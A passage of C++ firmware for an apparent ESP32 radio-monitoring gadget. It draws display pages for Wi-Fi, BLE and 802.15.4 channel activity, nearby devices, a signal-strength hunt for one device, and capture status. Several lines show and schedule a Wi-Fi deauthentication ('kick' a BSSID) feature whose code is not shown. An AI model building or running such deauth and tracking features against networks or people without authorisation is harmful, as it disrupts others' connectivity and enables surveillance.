    lv_obj_t* lab = make_label(box, "far", c565(GREY_565), &lv_font_montserrat_12);
    lv_obj_align(lab, LV_ALIGN_BOTTOM_LEFT, 0, -24);
    lab = make_label(box, "near", c565(GREY_565), &lv_font_montserrat_12);
    lv_obj_align(lab, LV_ALIGN_BOTTOM_RIGHT, 0, -24);

    lv_obj_t* info = make_panel(page, 120, BG_565, 2);
    lv_obj_set_style_pad_row(info, 4, 0);
    lv_obj_set_flex_flow(info, LV_FLEX_FLOW_COLUMN);
    huntMacLbl = make_label(info, "", c565(CYAN_565), &lv_font_montserrat_14);
    huntNameLbl = make_label(info, "", c565(WHITE_565), &lv_font_montserrat_14);
    lv_obj_set_width(huntNameLbl, LV_PCT(100));
    lv_label_set_long_mode(huntNameLbl, LV_LABEL_LONG_CLIP);
    huntInfo1 = make_label(info, "", c565(GREY_565), &lv_font_montserrat_12);
    huntInfo2 = make_label(info, "", c565(GREY_565), &lv_font_montserrat_12);
    huntHint = make_label(page, "hold BOOT to stop hunting", c565(GREY_565), &lv_font_montserrat_12);
    lv_obj_set_width(huntHint, LV_PCT(100));
    lv_obj_set_style_text_align(huntHint, LV_TEXT_ALIGN_CENTER, 0);
}

void buildSystemPage(lv_obj_t* page) {
    lv_obj_t* hdrRight;
    make_header(page, "System", &hdrRight);
    char v[8];
    snprintf(v, sizeof(v), "v%s", kVersion);
    lv_label_set_text(hdrRight, v);
    lv_obj_t* box = make_panel(page, 280, BG_565, 2);
    lv_obj_set_style_pad_row(box, 4, 0);
    lv_obj_set_flex_flow(box, LV_FLEX_FLOW_COLUMN);
    for (int i = 0; i < kSysLines; i++) {
        sysLines[i] = make_label(box, "", c565(WHITE_565), &lv_font_montserrat_12);
        lv_obj_set_width(sysLines[i], LV_PCT(100));
        lv_label_set_long_mode(sysLines[i], LV_LABEL_LONG_CLIP);
    }
}

bool pageAvailable(int n) {
    if (n == PAGE_OVERVIEW || n == PAGE_CHANNELS) return hopMode();
    if (n == PAGE_HUNT) return huntActive;
    return true;
}

// Only the visible page exists as LVGL objects (the others are rebuilt on demand): the C5 has no PSRAM and
// the Wi-Fi/BLE stacks need most of the 320 KB, so ~300 permanent widgets are not affordable.
void showPage(int n) {
    n = ((n % PAGE_COUNT) + PAGE_COUNT) % PAGE_COUNT;
    for (int tries = 0; tries < PAGE_COUNT && !pageAvailable(n); tries++) n = (n + 1) % PAGE_COUNT;
    if (pages[currentPage] && n == currentPage) return;
    for (int i = 0; i < PAGE_COUNT; i++) {
        if (pages[i]) { lv_obj_delete(pages[i]); pages[i] = nullptr; }
    }
    currentPage = n;
    lv_obj_t* pg = make_page(lv_scr_act());
    pages[n] = pg;
    switch (n) {
        case PAGE_OVERVIEW: buildOverviewPage(pg); break;
        case PAGE_CHANNELS: buildChannelsPage(pg); break;
        case PAGE_DEVICES:  buildDevicesPage(pg); break;
        case PAGE_HUNT:     buildHuntPage(pg); break;
        default:            buildSystemPage(pg); break;
    }
}

void buildUi() {
    lv_obj_t* scr = lv_scr_act();
    lv_obj_set_style_bg_color(scr, c565(BG_565), 0);
    lv_obj_remove_flag(scr, LV_OBJ_FLAG_SCROLLABLE);
    showPage(PAGE_OVERVIEW);
}

bool recording() { return sdCapEnabled || captureEnabled; }

// Paint a header label red while recording so the LCD has an unmistakable record light, not just a word.
void applyRecColor(lv_obj_t* lbl) {
    if (!lbl) return;
    lv_obj_set_style_text_color(lbl, recording() ? c565(RED_565) : c565(GREY_565), 0);
}

// "SD", "USB" or "REC" (both) while a capture is running; empty otherwise.
const char* recTag() {
    if (sdCapEnabled && captureEnabled) return " REC";
    if (sdCapEnabled) return " SD";
    if (captureEnabled) return " USB";
    return "";
}

void chanHeaderText(char* buf, size_t n) {
    if (!hopMode()) { snprintf(buf, n, "BLE"); return; }
    const char* band = (currentIdx >= 0 && is154(currentIdx)) ? "15.4" : (currentIdx >= 0 && is5g(currentIdx)) ? "5G" : "2.4G";
    if (!monitorReady)       snprintf(buf, n, "no ch%s", recTag());
    else if (parkedIdx >= 0) snprintf(buf, n, "park %u%s", kChannels[currentIdx], recTag());
    else                     snprintf(buf, n, "%s ch%u%s", band, kChannels[currentIdx], recTag());
}

void refreshOverview(float global) {
    char buf[64];
    char r1[16], r2[16];
    lv_bar_set_value(globalBar, static_cast<int>(global + 0.5f), LV_ANIM_OFF);
    lv_obj_set_style_bg_color(globalBar, scoreColor(global), LV_PART_INDICATOR);
    snprintf(buf, sizeof(buf), "%.0f", global);
    lv_label_set_text(globalLabel, buf);
    snprintf(buf, sizeof(buf), "sweep %lu", static_cast<unsigned long>(sweepCount));
    lv_label_set_text(sweepLabel, buf);
    chanHeaderText(buf, sizeof(buf));
    lv_label_set_text(chanLabel, buf);
    applyRecColor(chanLabel);

    int top[3];
    sortTop3(top);
    for (int i = 0; i < 3; i++) {
        if (top[i] < 0) {
            lv_label_set_text(topRows[i], "--");
            lv_label_set_text(topRates[i], "");
            lv_bar_set_value(topBars[i], 0, LV_ANIM_OFF);
            continue;
        }
        const ChannelState& ch = channels[top[i]];
        snprintf(buf, sizeof(buf), "ch%u %.0f", kChannels[top[i]], ch.busyEma);
        lv_label_set_text(topRows[i], buf);
        lv_bar_set_value(topBars[i], static_cast<int>(ch.busyEma + 0.5f), LV_ANIM_OFF);
        lv_obj_set_style_bg_color(topBars[i], scoreColor(ch.busyEma), LV_PART_INDICATOR);
        fmtRate(r1, sizeof(r1), ch.metrics.frames * 1000.0f / kDwellMs, "/s");
        lv_label_set_text(topRates[i], r1);
    }

    const int nEnabled = enabledCount();
    int barW = (150 / (nEnabled > 0 ? nEnabled : 1)) - 1;
    if (barW < 2) barW = 2;
    if (barW > 10) barW = 10;
    for (int i = 0; i < kChannelCount; i++) {
        const ChannelState& ch = channels[i];
        if (!chanEnabled(i)) { lv_obj_add_flag(specBars[i], LV_OBJ_FLAG_HIDDEN); continue; }
        lv_obj_remove_flag(specBars[i], LV_OBJ_FLAG_HIDDEN);
        lv_obj_set_width(specBars[i], barW);
        int h = 2;
        lv_color_t col = c565(DIM_565);
        if (ch.unavailable) {
            col = c565(BLACK_565);
        } else if (ch.hasData) {
            h = 2 + static_cast<int>(ch.busyEma * 34.0f / 100.0f);
            col = (ch.busyEma < 3.0f) ? c565(GREY_565) : scoreColor(ch.busyEma);
        }
        if (i == currentIdx && monitorReady) col = c565(CYAN_565);
        lv_obj_set_height(specBars[i], h);
        lv_obj_set_style_bg_color(specBars[i], col, 0);
    }
    lv_label_set_text(specLabel, bandMode == BAND_5G ? "36-64   100-144   149-165"
                                 : bandMode == BAND_24G ? "2.4 GHz channels 1-13"
                                 : bandMode == BAND_154 ? "802.15.4 channels 11-26"
                                 : "1-13 | 36-64 | 100-144 | 149-165");

    const int curIdx = currentIdx < 0 ? 0 : currentIdx;
    const ChannelState& cur = channels[curIdx];
    if (cur.hasData) {
        fmtRate(r1, sizeof(r1), cur.metrics.frames * 1000.0f / kDwellMs, " pkt/s");
        fmtRate(r2, sizeof(r2), cur.metrics.bytes * 1000.0f / kDwellMs, " B/s");
        snprintf(buf, sizeof(buf), "ch%u: %s  %s", kChannels[curIdx], r1, r2);
        lv_label_set_text(statsLine1, buf);
        snprintf(buf, sizeof(buf), "talkers %u  strong %u/%lu  raw %.0f", cur.metrics.unique, cur.metrics.strong,
                 static_cast<unsigned long>(cur.metrics.frames), cur.busyCurrent);
        lv_label_set_text(statsLine2, buf);
    } else {
        lv_label_set_text(statsLine1, "listening...");
        lv_label_set_text(statsLine2, "");
    }

    if (captureEnabled) {
        snprintf(buf, sizeof(buf), "APs %u  " LV_SYMBOL_DOWNLOAD " %lu  drop %lu", lastApSeen,
                 static_cast<unsigned long>(capSent), static_cast<unsigned long>(capDropped));
    } else {
        snprintf(buf, sizeof(buf), "APs %u", lastApSeen);
    }
    lv_label_set_text(footLabel, buf);
}

void refreshChannels(float global) {
    char buf[48];
    chanHeaderText(buf, sizeof(buf));
    lv_label_set_text(listChanLabel, buf);
    applyRecColor(listChanLabel);
    int slot = 0;
    for (int i = 0; i < kChannelCount && slot < kListSlots; i++) {
        if (!chanEnabled(i)) continue;
        const ChannelState& ch = channels[i];
        lv_obj_remove_flag(listRow[slot], LV_OBJ_FLAG_HIDDEN);
        snprintf(buf, sizeof(buf), "%u", kChannels[i]);
        lv_label_set_text(listName[slot], buf);
        lv_obj_set_style_text_color(listName[slot], (i == currentIdx && monitorReady) ? c565(CYAN_565)
                                                    : ch.unavailable ? c565(GREY_565) : c565(WHITE_565), 0);
        if (ch.unavailable) {
            lv_label_set_text(listVal[slot], "x");
            lv_bar_set_value(listBar[slot], 0, LV_ANIM_OFF);
        } else if (!ch.hasData) {
            lv_label_set_text(listVal[slot], "-");
            lv_bar_set_value(listBar[slot], 0, LV_ANIM_OFF);
        } else {
            snprintf(buf, sizeof(buf), "%.0f", ch.busyEma);
            lv_label_set_text(listVal[slot], buf);
            lv_bar_set_value(listBar[slot], static_cast<int>(ch.busyEma + 0.5f), LV_ANIM_OFF);
            lv_obj_set_style_bg_color(listBar[slot], scoreColor(ch.busyEma), LV_PART_INDICATOR);
        }
        slot++;
    }
    for (; slot < kListSlots; slot++) lv_obj_add_flag(listRow[slot], LV_OBJ_FLAG_HIDDEN);
    snprintf(buf, sizeof(buf), "max %.0f  sweep %lu  APs %u", global, static_cast<unsigned long>(sweepCount), lastApSeen);
    lv_label_set_text(listFoot, buf);
}

inline int rssiPct(int rssi) {   // -100 dBm -> 0, -30 dBm -> 100
    int p = (rssi + 100) * 100 / 70;
    return p < 0 ? 0 : p > 100 ? 100 : p;
}

struct DevRowInfo { uint8_t mac[6]; int8_t rssi; bool ap; uint8_t surv; bool destOnly; char label[33]; };
DevRowInfo devRows[kDevRows];
int devRowCount = 0;

void refreshDevices() {
    static uint32_t lastSortMs = 0;
    const uint32_t now = millis();
    if (now - lastSortMs >= 500) {
        lastSortMs = now;
        if (mode154()) {
            static const char* const kProto[] = {"15.4", "ZigB", "ZGP", "Thrd", "sec"};
            const int zn = snapshot154(devSnap.z, kDev154Slots, kDevLcdFreshMs);
            sortByRssi(devSnap.z, zn);
            devRowCount = zn < kDevRows ? zn : kDevRows;
            for (int i = 0; i < devRowCount; i++) {
                const Dev154& d = devSnap.z[i];
                memcpy(devRows[i].mac, d.key, 6);
                devRows[i].rssi = d.rssi;
                devRows[i].ap = d.flags & 2;
                devRows[i].surv = 0;
                devRows[i].destOnly = false;
                if (d.flags & 1) snprintf(devRows[i].label, 33, "%s %02x%02x%02x", kProto[d.proto < 5 ? d.proto : 0], d.key[5], d.key[6], d.key[7]);
                else snprintf(devRows[i].label, 33, "%s %04x", kProto[d.proto < 5 ? d.proto : 0], d.shortAddr);
                if (d.flags & 4) strncat(devRows[i].label, " join", 32 - strlen(devRows[i].label));
            }
        } else if (wifiMode()) {
            const int wn = snapshotWifi(devSnap.w, kWifiDevSlots, kDevLcdFreshMs);
            sortByRssi(devSnap.w, wn);
            devRowCount = wn < kDevRows ? wn : kDevRows;
            for (int i = 0; i < devRowCount; i++) {
                memcpy(devRows[i].mac, devSnap.w[i].mac, 6);
                devRows[i].rssi = devSnap.w[i].rssi;
                devRows[i].ap = devSnap.w[i].flags & 1;
                devRows[i].surv = devSnap.w[i].surv;
                devRows[i].destOnly = devSnap.w[i].flags & 4;
                strncpy(devRows[i].label, devSnap.w[i].ssid, 32); devRows[i].label[32] = 0;
            }
        } else {
            const int bn = snapshotBle(devSnap.b, kBleDevSlots, kDevLcdFreshMs);
            sortByRssi(devSnap.b, bn);
            devRowCount = bn < kDevRows ? bn : kDevRows;
            for (int i = 0; i < devRowCount; i++) {
                memcpy(devRows[i].mac, devSnap.b[i].mac, 6);
                devRows[i].rssi = devSnap.b[i].rssi;
                devRows[i].ap = false;
                devRows[i].surv = devSnap.b[i].surv;
                devRows[i].destOnly = false;
                strncpy(devRows[i].label, devSnap.b[i].name, 32); devRows[i].label[32] = 0;
            }
        }
    }
    char buf[48];
    const int n = devRowCount;
    if (bandMode == BAND_BLE)
        snprintf(buf, sizeof(buf), "BLE %d %s%s", n, bleActiveScan ? "act" : "psv", recTag());
    else
        snprintf(buf, sizeof(buf), "%s %d%s", mode154() ? "15.4" : "WiFi", n, recTag());
    lv_label_set_text(devHdrRight, buf);
    applyRecColor(devHdrRight);
    for (int i = 0; i < kDevRows; i++) {
        if (i >= n) { lv_obj_add_flag(devRow[i], LV_OBJ_FLAG_HIDDEN); continue; }
        lv_obj_remove_flag(devRow[i], LV_OBJ_FLAG_HIDDEN);
        const uint8_t* mac = devRows[i].mac;
        const int rssi = devRows[i].rssi;
        const char* label = devRows[i].label;
        const bool ap = devRows[i].ap;
        // "!" marks known surveillance hardware, "~" a device only ever seen as a destination (tier 1).
        const char* pfx = devRows[i].surv ? "! " : devRows[i].destOnly ? "~ " : ap ? "* " : "";
        if (devRows[i].surv)      snprintf(buf, sizeof(buf), "%s%s", pfx, kSurvName[devRows[i].surv]);
        else if (label[0])        snprintf(buf, sizeof(buf), "%s%s", pfx, label);
        else                      snprintf(buf, sizeof(buf), "%s%02x:%02x:%02x", pfx, mac[3], mac[4], mac[5]);
        lv_label_set_text(devName[i], buf);
        const bool hunted = huntActive && (huntKind == 1 ? memcmp(mac, huntKey, 6) == 0 : macEq(mac, huntMac));
        lv_obj_set_style_text_color(devName[i], devRows[i].surv ? c565(ORANGE_565)
                                               : hunted ? c565(CYAN_565)
                                               : devRows[i].destOnly ? c565(GREY_565) : c565(WHITE_565), 0);
        snprintf(buf, sizeof(buf), "%d", rssi);
        lv_label_set_text(devRssi[i], buf);
        lv_bar_set_value(devBar[i], rssiPct(rssi), LV_ANIM_OFF);
        lv_obj_set_style_bg_color(devBar[i], rssiColor(rssi), LV_PART_INDICATOR);
    }
    if (mode154()) snprintf(buf, sizeof(buf), "* = beacons (router)  seen < 20 s");
    else if (wifiMode()) snprintf(buf, sizeof(buf), "* = AP (beacons)  seen < 20 s");
    else snprintf(buf, sizeof(buf), "BLE scan cycle %lu  seen < 20 s", static_cast<unsigned long>(bleScanCycles));
    lv_label_set_text(devFoot, buf);
}

void refreshHunt() {
    char buf[64];
    const uint32_t last = huntLastMs;
    const int rssi = huntRssi;
    const bool seen = last != 0;
    const uint32_t age = seen ? millis() - last : 0;
    lv_label_set_text(huntHdrRight, recording() ? recTag() + 1 : hopMode() ? (parkedIdx >= 0 ? "parked" : "hopping") : "BLE");
    applyRecColor(huntHdrRight);
    if (seen && age < 5000) snprintf(buf, sizeof(buf), "%d", rssi);
    else snprintf(buf, sizeof(buf), "--");
    lv_label_set_text(huntBig, buf);
    lv_bar_set_value(huntBar, (seen && age < 5000) ? rssiPct(rssi) : 0, LV_ANIM_OFF);
    lv_obj_set_style_bg_color(huntBar, rssiColor(rssi), LV_PART_INDICATOR);
    huntIdText(buf, sizeof(buf));
    lv_label_set_text(huntMacLbl, buf);
    if (!huntLabel[0]) lookupHuntLabel();
    lv_label_set_text(huntNameLbl, huntLabel[0] ? huntLabel : "(no name seen)");
    if (seen) snprintf(buf, sizeof(buf), "seen %.1f s ago  hits %lu", age / 1000.0f, static_cast<unsigned long>(huntCount));
    else snprintf(buf, sizeof(buf), "not seen yet");
    lv_label_set_text(huntInfo1, buf);
    if (hopMode()) snprintf(buf, sizeof(buf), "listening ch %u%s", currentChannelNum, parkedIdx >= 0 ? " (parked)" : " (hopping)");
    else snprintf(buf, sizeof(buf), "BLE %s scan", bleActiveScan ? "active" : "passive");
    lv_label_set_text(huntInfo2, buf);
}

void refreshSystem(float global) {
    char buf[64];
    char r1[16], r2[16];
    int n = 0;
    if (hopMode()) {
        int top[3];
        sortTop3(top);
        if (top[0] >= 0) {
            const ChannelState& ch = channels[top[0]];
            fmtRate(r1, sizeof(r1), ch.metrics.frames * 1000.0f / kDwellMs, " pkt/s");
            fmtRate(r2, sizeof(r2), ch.metrics.bytes * 1000.0f / kDwellMs, " B/s");
            snprintf(buf, sizeof(buf), "busiest ch%u  score %.0f", kChannels[top[0]], ch.busyEma);
            lv_label_set_text(sysLines[n++], buf);
            snprintf(buf, sizeof(buf), "  %s  %s", r1, r2);
            lv_label_set_text(sysLines[n++], buf);
            snprintf(buf, sizeof(buf), "  talkers %u  strong %u/%lu", ch.metrics.unique, ch.metrics.strong,
                     static_cast<unsigned long>(ch.metrics.frames));
            lv_label_set_text(sysLines[n++], buf);
        } else {
            lv_label_set_text(sysLines[n++], "busiest: listening...");
            lv_label_set_text(sysLines[n++], "");
            lv_label_set_text(sysLines[n++], "");
        }
    } else {
        int devs = 0;
        const uint32_t now = millis();
        portENTER_CRITICAL(&g_devMux);
        for (int i = 0; i < kBleDevSlots; i++) if (bleDevs[i].lastMs && now - bleDevs[i].lastMs <= kDevFreshMs) devs++;
        portEXIT_CRITICAL(&g_devMux);
        snprintf(buf, sizeof(buf), "BLE mode: %d devices (60 s)", devs);
        lv_label_set_text(sysLines[n++], buf);
        snprintf(buf, sizeof(buf), "  scan %s -> %s  %lu adv", bleScanModeName(),
                 bleActiveScan ? "active" : "passive", static_cast<unsigned long>(bleAdvSeen));
        lv_label_set_text(sysLines[n++], buf);
        lv_label_set_text(sysLines[n++], "  Wi-Fi sniffing paused");
    }
    const uint32_t up = millis() / 1000;
    snprintf(buf, sizeof(buf), "uptime %02lu:%02lu:%02lu   max %.0f", static_cast<unsigned long>(up / 3600),
             static_cast<unsigned long>((up / 60) % 60), static_cast<unsigned long>(up % 60), global);
    lv_label_set_text(sysLines[n++], buf);
    int skipped = 0;
    for (int i = 0; i < kChannelCount; i++) if (chanEnabled(i) && channels[i].unavailable) skipped++;
    snprintf(buf, sizeof(buf), "sweeps %lu  dwell %u ms", static_cast<unsigned long>(sweepCount), static_cast<unsigned>(kDwellMs));
    lv_label_set_text(sysLines[n++], buf);
    snprintf(buf, sizeof(buf), "band %s  channels %d  skip %d", kBandName[bandMode], enabledCount(), skipped);
    lv_label_set_text(sysLines[n++], buf);
    if (parkedIdx >= 0) snprintf(buf, sizeof(buf), "park: ch%u", kChannels[parkedIdx]);
    else snprintf(buf, sizeof(buf), "park: off (hopping)");
    lv_label_set_text(sysLines[n++], buf);
    if (captureEnabled) snprintf(buf, sizeof(buf), "usb rec: %lu sent  %lu drop", static_cast<unsigned long>(capSent),
                                 static_cast<unsigned long>(capDropped));
    else snprintf(buf, sizeof(buf), "usb rec: off (host: cap 1)");
    lv_label_set_text(sysLines[n++], buf);
    if (sdCapEnabled) snprintf(buf, sizeof(buf), "sd: rec %lu fr  %lu kB", static_cast<unsigned long>(sdFrames),
                               static_cast<unsigned long>(sdBytes / 1024));
    else if (sdMounted) snprintf(buf, sizeof(buf), "sd: card ready (host: sdcap 1)");
    else snprintf(buf, sizeof(buf), "sd: no card");
    lv_label_set_text(sysLines[n++], buf);
    if (huntActive) { char m[26]; huntIdText(m, sizeof(m)); snprintf(buf, sizeof(buf), "hunt %s", m); }
    else snprintf(buf, sizeof(buf), "hunt off");
    if (deauthActive) {
        char d[26];
        fmtMac(d, sizeof(d), deauthBssid);
        snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf), " · kick %s", d);   // buf is 64: both MACs fit
    }
    lv_label_set_text(sysLines[n++], buf);
    snprintf(buf, sizeof(buf), "radio %s/%s/%s", errBand == ESP_OK ? "band ok" : "band ERR",
             errCountry == ESP_OK ? "cc ok" : "cc ERR", errPromisc == ESP_OK ? "promisc ok" : "promisc ERR");
    lv_label_set_text(sysLines[n++], buf);
    snprintf(buf, sizeof(buf), "heap %u kB free", static_cast<unsigned>(ESP.getFreeHeap() / 1024));
    lv_label_set_text(sysLines[n++], buf);
    lv_label_set_text(sysLines[n++], "BOOT: tap=page  hold=mode");
    lv_label_set_text(sysLines[n++], "(5g > 2.4g > both > ble > 15.4)");
    for (; n < kSysLines; n++) lv_label_set_text(sysLines[n], "");
}

void driveLed(float global) {
    if (deauthActive) { setLedColor(LED_RED, static_cast<uint8_t>((millis() / kUiIntervalMs & 1u) ? 12 : 70)); return; }   // blink while kicking
    if (huntActive) {
        const uint32_t last = huntLastMs;
        if (!last || millis() - last > 5000) { setLedColor(LED_BLUE, 15); return; }
        const int r = huntRssi;
        if (r >= -50)      setLedColor(LED_RED, 100);
        else if (r >= -62) setLedColor(LED_ORANGE, 80);
        else if (r >= -75) setLedColor(LED_YELLOW, 60);
        else if (r >= -88) setLedColor(LED_GREEN, 40);
        else               setLedColor(LED_BLUE, 30);
        return;
    }
    if (sdCapEnabled || captureEnabled) {
        // ~1.2 s breathing pulse so "recording" reads at a glance; colour says which sink.
        const uint32_t phase = millis() % 1200;
        const uint32_t tri = phase < 600 ? phase : (1200 - phase);          // 0..600
        const uint8_t bright = static_cast<uint8_t>(10 + (tri * 60) / 600); // 10..70
        setLedColor((sdCapEnabled && captureEnabled) ? LED_WHITE
                    : sdCapEnabled ? LED_MAGENTA : LED_CYAN_L, bright);
        return;
    }
    if (!hopMode()) { setLedColor(LED_BLUE, 25); return; }
    if (global > 75.0f)      setLedColor(LED_RED);
    else if (global > 50.0f) setLedColor(LED_ORANGE);
    else if (global > 25.0f) setLedColor(LED_YELLOW);
    else                     setLedColor(LED_GREEN);
}

void refreshUi() {
    const float global = hopMode() ? globalActivityMax() : 0.0f;
    driveLed(global);

    if (hopMode()) {
        uint16_t liveUnique;
        portENTER_CRITICAL(&g_accumMux);
        liveUnique = g_accum.unique;
        portEXIT_CRITICAL(&g_accumMux);
        const uint32_t nowMs = millis();
        if (apWindowStartedMs == 0) apWindowStartedMs = nowMs;
        if (liveUnique > apMaxWindow) apMaxWindow = liveUnique;
        if ((nowMs - apWindowStartedMs) >= kApUpdateMs) {
            lastApSeen = apMaxWindow;
            apWindowStartedMs = nowMs;
            apMaxWindow = 0;
        }
    }

    if (!pageAvailable(currentPage) || !pages[currentPage]) showPage(currentPage + 1);
    switch (currentPage) {
        case PAGE_OVERVIEW: refreshOverview(global); break;
        case PAGE_CHANNELS: refreshChannels(global); break;
        case PAGE_DEVICES:  refreshDevices(); break;
        case PAGE_HUNT:     refreshHunt(); break;
        default:            refreshSystem(global); break;
    }
}

void uiTimerCb(lv_timer_t* t) {
    (void)t;
    hopIfNeeded();
    serviceDeauth();
    refreshUi();
}

// ---------------------------------------------------------------------------------------------
// BOOT button: tap = next page, hold = cycle band mode (or stop the hunt when on the hunt page)
// ---------------------------------------------------------------------------------------------
void pollButton() {
    static bool wasDown = false;
    static uint32_t downSince = 0;
    static bool longFired = false;
    static uint32_t lastEdgeMs = 0;
    const uint32_t now = millis();
    const bool down = digitalRead(kBootButtonPin) == LOW;
    if (down != wasDown) {
        if (now - lastEdgeMs < 30) return;
        lastEdgeMs = now;
        wasDown = down;
        if (down) {
            downSince = now;
            longFired = false;
        } else if (!longFired) {
            showPage(currentPage + 1);
            refreshUi();
        }
        return;
    }
    if (down && !longFired && (now - downSince) >= kLongPressMs) {
        longFired = true;
        if (currentPage == PAGE_HUNT && huntActive) {
            stopHunt();
            if (serialRoom(80)) Serial.print("{\"t\":\"ack\",\"cmd\":\"hunt\",\"hunt\":null,\"park\":0}\n");
        } else {
            setBandMode(static_cast<BandMode>((bandMode + 1) % kBandModes));
            if (serialRoom(120)) Serial.printf("{\"t\":\"log\",\"msg\":\"button: band %s\"}\n", kBandName[bandMode]);
            sendHello();
        }
        refreshUi();
    }
}

} // namespace

void Bandwatch_Init(void) {
    pinMode(kBootButtonPin, INPUT_PULLUP);
    memset(wifiDevs, 0, sizeof(wifiDevs));
    memset(bleDevs, 0, sizeof(bleDevs));
    memset(devs154, 0, sizeof(devs154));
    // Probe the card at boot so "hello" can tell the dashboard whether SD recording is available.
    // SPI is already up: LCD_Init() runs before this, and both share the bus from the loop task.
    sdProbeAtBoot();

    setLedColor({255, 0, 0}, 100);
    delay(120);
    setLedColor({0, 255, 0}, 100);
    delay(120);
    setLedColor({0, 0, 255}, 100);
    delay(120);
    rgbLedWrite(kRgbPin, 0, 0, 0);

    Serial.printf("{\"t\":\"log\",\"msg\":\"boot: heap before UI %u\"}\n", static_cast<unsigned>(ESP.getFreeHeap()));
    buildUi();
    Serial.printf("{\"t\":\"log\",\"msg\":\"boot: heap after UI %u\"}\n", static_cast<unsigned>(ESP.getFreeHeap()));
    lv_timer_create(uiTimerCb, kUiIntervalMs, nullptr);
    startWifi();
    Serial.printf("{\"t\":\"log\",\"msg\":\"boot: heap after wifi %u\"}\n", static_cast<unsigned>(ESP.getFreeHeap()));
    sendHello();
    refreshUi();
}

void Bandwatch_Loop(void) {
    static uint32_t lastDevMs = 0;
    pollSerial();
    pollButton();
    serviceSdRead();
    drainCapture();
    serviceBle();
    const uint32_t now = millis();
    if (now - lastDevMs >= kDevListMs) {
        lastDevMs = now;
        sendDevices();
    }
    if (bandMode == BAND_BLE && now - bleStatusMs >= 1000) {
        bleStatusMs = now;
        sendBleStatus();
    }
}
